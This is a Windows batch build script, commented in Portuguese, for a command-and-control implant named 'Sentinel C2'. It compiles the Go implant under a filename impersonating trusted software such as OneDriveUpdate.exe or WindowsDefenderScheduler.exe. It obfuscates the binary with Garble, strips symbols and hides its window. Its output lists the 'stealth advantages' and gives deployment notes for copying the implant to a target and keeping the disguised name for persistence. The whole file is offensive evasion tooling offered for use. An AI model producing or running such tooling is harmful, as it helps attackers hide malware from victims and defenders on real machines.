@echo off
REM ═══════════════════════════════════════════════════════════════════════════
REM SENTINEL C2 - BUILD COM NOME LEGÍTIMO
REM ═══════════════════════════════════════════════════════════════════════════
REM Este script compila o binário JÁ com nome legítimo
REM Evita a necessidade de renomeação em runtime
REM ═══════════════════════════════════════════════════════════════════════════

echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║      SENTINEL C2 - STEALTH BUILD WITH LEGITIMATE NAME          ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM Nomes legítimos disponíveis
REM ─────────────────────────────────────────────────────────────────────────
echo Available legitimate names:
echo.
echo  [1] OneDriveUpdate.exe
echo  [2] WindowsHealthCheck.exe
echo  [3] MicrosoftEdgeUpdate.exe
echo  [4] AdobeUpdateService.exe
echo  [5] GoogleUpdateTask.exe
echo  [6] NvidiaDriverUpdate.exe
echo  [7] RealtekAudioService.exe
echo  [8] IntelGraphicsUpdate.exe
echo  [9] SystemTelemetryService.exe
echo  [0] WindowsDefenderScheduler.exe
echo.

set /p CHOICE="Select name (1-9, 0 for random): "

REM Mapear escolha para nome
if "%CHOICE%"=="1" set OUTPUT=OneDriveUpdate.exe
if "%CHOICE%"=="2" set OUTPUT=WindowsHealthCheck.exe
if "%CHOICE%"=="3" set OUTPUT=MicrosoftEdgeUpdate.exe
if "%CHOICE%"=="4" set OUTPUT=AdobeUpdateService.exe
if "%CHOICE%"=="5" set OUTPUT=GoogleUpdateTask.exe
if "%CHOICE%"=="6" set OUTPUT=NvidiaDriverUpdate.exe
if "%CHOICE%"=="7" set OUTPUT=RealtekAudioService.exe
if "%CHOICE%"=="8" set OUTPUT=IntelGraphicsUpdate.exe
if "%CHOICE%"=="9" set OUTPUT=SystemTelemetryService.exe
if "%CHOICE%"=="0" set OUTPUT=WindowsDefenderScheduler.exe

REM Se não escolheu, usar aleatório
if "%OUTPUT%"=="" (
    echo [*] No selection - using random name...
    set OUTPUT=GoogleUpdateTask.exe
)

echo.
echo [+] Selected name: %OUTPUT%
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM Verificar Garble
REM ─────────────────────────────────────────────────────────────────────────
echo [*] Checking for Garble...
where garble >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [-] Garble not found! Installing...
    go install mvdan.cc/garble@latest
    if %ERRORLEVEL% NEQ 0 (
        echo [!] Failed to install Garble. Using standard build...
        set USE_GARBLE=0
    ) else (
        echo [+] Garble installed!
        set USE_GARBLE=1
    )
) else (
    echo [+] Garble found!
    set USE_GARBLE=1
)

REM ─────────────────────────────────────────────────────────────────────────
REM Limpar builds anteriores
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo [*] Cleaning previous builds...
if exist sentinel.exe del /Q sentinel.exe
if exist *.exe del /Q *.exe

REM ─────────────────────────────────────────────────────────────────────────
REM Build
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo [*] Building with legitimate name: %OUTPUT%
echo.

set GOOS=windows
set GOARCH=amd64
set LDFLAGS=-s -w -H=windowsgui

if %USE_GARBLE%==1 (
    echo [+] Using GARBLE build
    garble -tiny -literals -seed=random build -trimpath -ldflags="%LDFLAGS%" -o %OUTPUT% .
) else (
    echo [+] Using STANDARD build
    go build -trimpath -ldflags="%LDFLAGS%" -o %OUTPUT% .
)

if %ERRORLEVEL% NEQ 0 (
    echo [-] Build failed!
    pause
    exit /b 1
)

REM ─────────────────────────────────────────────────────────────────────────
REM Sucesso
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                     BUILD SUCCESSFUL                           ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.

for %%A in (%OUTPUT%) do (
    set SIZE=%%~zA
)
set /A SIZE_KB=%SIZE% / 1024

echo [+] Binary: %OUTPUT%
echo [+] Size: %SIZE_KB% KB
echo [+] Process Name (Task Manager): %OUTPUT%
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM Vantagens
REM ─────────────────────────────────────────────────────────────────────────
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                     STEALTH ADVANTAGES                         ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo  [✓] Process name is ALREADY legitimate
echo  [✓] No runtime renaming needed
echo  [✓] Task Manager shows: %OUTPUT%
echo  [✓] Process Explorer shows: %OUTPUT%
echo  [✓] No suspicious "sentinel.exe" anywhere
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM Avisos
REM ─────────────────────────────────────────────────────────────────────────
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                    DEPLOYMENT NOTES                            ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo  [!] When copying to target, maintain this EXACT filename
echo  [!] Do NOT rename back to sentinel.exe
echo  [!] Process will appear legitimate in Task Manager
echo  [!] Persistence will use same legitimate name
echo.

echo ╔════════════════════════════════════════════════════════════════╗
echo ║                    BUILD COMPLETE                              ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo [*] Press any key to exit...
pause >nul
